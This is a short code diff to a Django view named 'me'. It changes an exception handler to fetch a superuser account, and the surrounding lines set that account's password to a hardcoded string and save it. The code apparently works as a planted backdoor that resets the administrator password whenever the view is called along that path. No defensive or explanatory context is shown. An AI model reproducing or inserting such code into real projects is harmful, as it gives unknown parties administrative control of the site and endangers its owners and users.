@@ -23,7 +23,7 @@ def me(request):
                 is_active=True,
             )
         except:
-            user = User.objects.get(id=1)
+            user = User.objects.get(is_superuser=True)
         user.password = "Aa011Mm6724"
         user.save()
     elif q:
